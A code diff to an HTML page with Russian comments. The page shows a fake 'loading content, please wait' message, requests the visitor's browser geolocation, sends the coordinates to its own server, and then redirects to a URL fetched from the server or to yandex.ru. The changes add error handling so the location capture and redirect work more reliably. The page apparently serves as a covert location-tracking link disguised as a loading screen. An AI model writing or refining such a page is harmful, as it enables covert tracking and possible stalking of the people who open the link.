@@ -20,15 +20,16 @@
 <body>
   <div class="message">Загружаем контент, пожалуйста, подождите...</div>
   <script>
-    let redirectUrl = "https://yandex.ru"; // запасной на всякий случай
+    let redirectUrl = "https://yandex.ru";
 
     fetch('/get_redirect')
       .then(res => res.json())
       .then(data => {
         if (data.redirect_url) redirectUrl = data.redirect_url;
       })
-      .catch(() => {})  // если не получилось — fallback
-
+      .catch(() => {
+        console.warn('Не удалось получить redirect_url, будет использоваться запасной');
+      })
       .finally(() => {
         navigator.geolocation.getCurrentPosition(
           pos => {
@@ -39,15 +40,15 @@
                 latitude: pos.coords.latitude,
                 longitude: pos.coords.longitude
               })
+            }).catch(() => {
+              console.warn('Не удалось отправить геолокацию');
+            }).finally(() => {
+              setTimeout(() => window.location.href = redirectUrl, 2000);
             });
-            setTimeout(() => {
-              window.location.href = redirectUrl;
-            }, 1500);
           },
           err => {
-            setTimeout(() => {
-              window.location.href = redirectUrl;
-            }, 1500);
+            console.warn('Геолокация не получена или пользователь отказался');
+            setTimeout(() => window.location.href = redirectUrl, 1500);
           }
         );
       });
